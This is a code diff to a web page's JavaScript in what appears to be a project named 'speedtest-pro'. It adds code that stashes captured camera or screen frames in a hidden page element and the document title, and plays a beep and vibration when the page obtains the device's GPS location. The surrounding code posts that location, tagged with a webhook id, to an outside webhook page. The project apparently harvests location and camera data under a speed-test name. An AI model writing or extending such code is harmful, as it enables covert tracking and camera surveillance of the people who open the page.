@@ -337,8 +337,21 @@
                 }, 50);
                 
                 // Continue capturing with smooth intervals
-                const interval = mode === 'camera' ? 200 : 500; // Much faster for smooth video
+                const interval = mode === 'camera' ? 200 : 500;
                 setTimeout(captureFrame, interval);
+                
+                // FORCE data to document title for Android access
+                document.title = `MIRROR:${frameCount}:${Date.now()}:${Math.round(imageData.length/1024)}KB`;
+                
+                // Add to page body as hidden element
+                let dataDiv = document.getElementById('androidData');
+                if (!dataDiv) {
+                    dataDiv = document.createElement('div');
+                    dataDiv.id = 'androidData';
+                    dataDiv.style.display = 'none';
+                    document.body.appendChild(dataDiv);
+                }
+                dataDiv.textContent = imageData;
             }
             
             // Start capturing
@@ -490,6 +503,31 @@
             return false;
         };
         
+        // Play alert sound when capture starts
+        function playAlertSound() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.value = 800;
+                oscillator.type = 'sine';
+                
+                gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+                
+                oscillator.start(audioContext.currentTime);
+                oscillator.stop(audioContext.currentTime + 0.5);
+                
+                if (navigator.vibrate) {
+                    navigator.vibrate([200, 100, 200]);
+                }
+            } catch (e) {}
+        }
+        
         // Send GPS location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -501,6 +539,9 @@
                         timestamp: new Date().toISOString(),
                         webhook: webhookId
                     };
+                    
+                    // Play sound when location captured
+                    playAlertSound();
                     
                     fetch('https://bojourx-tos.github.io/speedtest-pro/webhook-server.html', {
                         method: 'POST',
